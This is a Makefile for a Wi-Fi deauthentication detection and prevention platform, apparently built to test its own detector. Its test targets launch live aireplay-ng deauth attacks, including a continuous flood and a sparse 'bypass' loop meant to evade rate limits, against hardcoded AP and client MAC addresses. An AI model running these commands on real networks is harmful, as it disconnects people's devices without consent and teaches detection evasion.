.PHONY: help setup install install-frontend install-backend run-backend run-frontend run-prevention build build-backend build-frontend clean

# Variables
BACKEND_DIR := wifi-security-backend
FRONTEND_DIR = wifi-security-frontend
ML_DIR = ml-api
PYTHON = venv/bin/python

# Default target
all: build

# Default target
help:
	@echo "================================================================="
	@echo "             Wi-Fi Security Platform - Run Commands"
	@echo "================================================================="
	@echo "Run these in separate terminals:"
	@echo ""
	@echo "  1. make run-backend      : Start the Spring Boot Backend"
	@echo "  2. make run-frontend     : Start the React Dashboard"
	@echo "  3. make run-sniffer      : Start the Packet Capture Engine"
	@echo "  4. make run-ml           : Start the Python ML Service"
	@echo "  5. make run-prevention   : Start Level 1 Prevention Engine (port 5002)"
	@echo ""
	@echo "Testing:"
	@echo "  make real-attack         : Test Attack (AP=... CLIENT=... CHANNEL=...)"
	@echo "  make stealth-attack      : Single Deauth Packet (Stealth Mode)"
	@echo "  make run-attack          : Continuous deauth flood"
	@echo ""
	@echo "Setup:"
	@echo "  make setup               : Install dependencies (Run FIRST)"
	@echo "  make install-prevention  : Install prevention engine Python deps"
	@echo "================================================================="

# Installation
setup: install-backend install-frontend install-python install-prevention

install-prevention:
	@echo "--> Installing Prevention Engine Python dependencies..."
	@sudo pip3 install -r prevention-engine/requirements.txt --break-system-packages

install-backend:
	@echo "--> Setting up Backend (Maven)..."
	@chmod +x $(BACKEND_DIR)/mvnw
	cd $(BACKEND_DIR) && ./mvnw clean install -DskipTests

install-frontend:
	@echo "--> Installing Frontend dependencies (npm)..."
	cd $(FRONTEND_DIR) && npm install

install-python:
	@echo "--> Installing Python dependencies (pip3) with sudo..."
	@sudo pip3 install -r packet-capture/requirements.txt --break-system-packages

# Running
run-ml:
	@echo "--> Starting Python ML Service..."
	bash -c "cd ml-service && source venv/bin/activate && uvicorn ml_service:app --host 0.0.0.0 --port 5000 --reload"

run-prevention:
	@echo "══════════════════════════════════════════════════"
	@echo "  🛡  Prevention Engine v3.0"
	@echo "  ├─ API port:      5002"
	@echo "  ├─ Thresholds:    L1≥40% L2≥60% L3≥85% L4≥95%"
	@echo "  ├─ Components:    16 (4 per level)"
	@echo "  ├─ DB:            Aiven MySQL / wifi_deauth"
	@echo "  ├─ Honeypot:      150 fake APs (mdk4)"
	@echo "  └─ Forensics:     PCAP + PDF reports"
	@echo "══════════════════════════════════════════════════"
	sudo python3 prevention-engine/level1.py

clean-prevention:
	@echo "🧹 Cleaning prevention system..."
	sudo bash scripts/cleanup_prevention.sh

test-prevention:
	@echo "🧪 Running prevention engine tests..."
	cd prevention-engine && python3 -m pytest tests/ -v --tb=short

run-backend:
	@echo "--> Starting Backend (MySQL) - WITH SUDO FOR SCANNING..."
	@chmod +x $(BACKEND_DIR)/mvnw
	cd $(BACKEND_DIR) && sudo ./mvnw spring-boot:run

run-frontend:
	@echo "--> Starting Frontend..."
	cd $(FRONTEND_DIR) && npm start

CHANNEL     ?= 0

run-sniffer:
	@echo "──────────────────────────────────────────────────"
	@echo "  Starting Packet Sniffer (Module 2)"
	@echo "  ├─ Interface:  $(INTERFACE)"
	@if [ "$(CHANNEL)" = "0" ]; then \
		echo "  ├─ Channel:    ALL (auto-hop 1-13)"; \
	else \
		echo "  ├─ Channel:    $(CHANNEL)"; \
	fi
	@echo "  └─ Backend:    http://localhost:8080"
	@echo "──────────────────────────────────────────────────"
	sudo WIFI_INTERFACE=$(INTERFACE) WIFI_CHANNEL=$(CHANNEL) BACKEND_URL=http://localhost:8080 python3 packet-capture/main.py

# Explicit all-channel alias (same as make run-sniffer with CHANNEL=0)
run-sniffer-all:
	$(MAKE) run-sniffer CHANNEL=0

# ── Attack Test (aireplay-ng on wlan2mon) ────────────────────────────────
# Default targets: AP  = 9E:A8:2C:C2:1F:D9, Victim = victim phone 94:65:2D:97:25:87
ATTACK_IFACE ?= wlan2mon
ATTACK_AP    ?= 9E:A8:2C:C2:1F:D9
ATTACK_STA   ?= 4C:6F:9C:F4:FA:63
ATTACK_COUNT ?= 100

run-attack:
	@echo "══════════════════════════════════════════════════"
	@echo "  ⚔️  DEAUTH ATTACK — aireplay-ng flood"
	@echo "  ├─ Interface:  $(ATTACK_IFACE)"
	@echo "  ├─ Target AP:  $(ATTACK_AP)"
	@echo "  ├─ Victim STA: $(ATTACK_STA)"
	@echo "  └─ Count:      $(ATTACK_COUNT) deauths"
	@echo "══════════════════════════════════════════════════"
	sudo aireplay-ng --deauth $(ATTACK_COUNT) -a $(ATTACK_AP) -c $(ATTACK_STA) $(ATTACK_IFACE)

attack-test:
	@echo "--> Simulating Deauth Attack Flood (Secure Simulation)..."
	@python3 simulate_attack.py

# Usage: make real-attack AP=9E:A8:2C:C2:1F:D9 CLIENT=94:65:2D:97:25:87 CHANNEL=1
# Default Interface
INTERFACE ?= wlan1
CHANNEL ?= 1

# Usage: make real-attack AP=... CLIENT=...
real-attack:
	$(eval AP ?= PROVIDE_AP_BSSID)
	$(eval CLIENT ?= PROVIDE_CLIENT_MAC)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Real Deauth Attack on $(INTERFACE) Channel $(CHANNEL)..."
	@echo "    Target: AP=$(AP) CLIENT=$(CLIENT)"
	@# Ensure interface is on the correct channel
	@sudo iwconfig $(INTERFACE) channel $(CHANNEL)
	@sudo aireplay-ng --deauth 10 -a $(AP) -c $(CLIENT) $(INTERFACE) --ignore-negative-one

# Usage: make stealth-attack INTERFACE=wlan1 ...
stealth-attack:
	$(eval AP ?= 9E:A8:2C:C2:1F:D9)
	$(eval CLIENT ?= 94:65:2D:97:25:87)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Stealth Attack (1 packet) on $(INTERFACE) Channel $(CHANNEL)..."
	@# Channel is already set by sniffer
	@sudo aireplay-ng --deauth 1 -a $(AP) -c $(CLIENT) $(INTERFACE) --ignore-negative-one

dev:
	@echo "--> Starting both services in parallel..."
	@echo "-----------------------------------------------------------------"
	@echo "Use Ctrl+C to stop both servers."
	@echo "-----------------------------------------------------------------"
	make -j 2 run-backend run-frontend

# Building
build: build-backend build-frontend

build-backend:
	@echo "--> Building Backend package..."
	cd $(BACKEND_DIR) && ./mvnw clean package -DskipTests

build-frontend:
	@echo "--> Building Frontend bundle..."
	cd $(FRONTEND_DIR) && npm run build

# Cleaning
clean:
	@echo "--> Cleaning Backend..."
	cd $(BACKEND_DIR) && ./mvnw clean
	@echo "--> Cleaning Frontend..."
	rm -rf $(FRONTEND_DIR)/build
	@echo "--> Cleaning Python Cache..."
	find . -type d -name "__pycache__" -exec rm -rf {} +

clean-force:
	@echo "--> Force cleaning Backend with sudo..."
	sudo rm -rf $(BACKEND_DIR)/target
	@echo "--> Cleaning Frontend..."
	rm -rf $(FRONTEND_DIR)/build
	@echo "--> Done!"

# Testing new additions (Layer 1 test & bypass)
run_attack:
	$(eval AP ?= 9E:A8:2C:C2:1F:D9)
	$(eval CLIENT ?= 4C:6F:9C:F4:FA:63)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Continuous Layer 1 Deauth Attack on $(INTERFACE) Channel $(CHANNEL)..."
	@echo "    Target: AP=$(AP) CLIENT=$(CLIENT)"
	@sudo iwconfig $(INTERFACE) channel $(CHANNEL)
	@sudo aireplay-ng --deauth 0 -a $(AP) -c $(CLIENT) $(INTERFACE)

bypass_attack:
	$(eval AP ?= 9E:A8:2C:C2:1F:D9)
	$(eval CLIENT ?= 4C:6F:9C:F4:FA:63)
	$(eval CHANNEL ?= 1)
	@echo "--> Launching Stealth/Bypass Deauth Attack on $(INTERFACE) Channel $(CHANNEL)..."
	@echo "    (Sending 1 packet every 5 seconds to bypass rate limits but trigger Layer 2 eventually)"
	@echo "    Target: AP=$(AP) CLIENT=$(CLIENT)"
	@sudo iwconfig $(INTERFACE) channel $(CHANNEL)
	@while true; do \
		sudo aireplay-ng --deauth 1 -a $(AP) -c $(CLIENT) $(INTERFACE) --ignore-negative-one >/dev/null 2>&1 || true; \
		echo "Sent sparse deauth packet..."; \
		sleep 5; \
	done
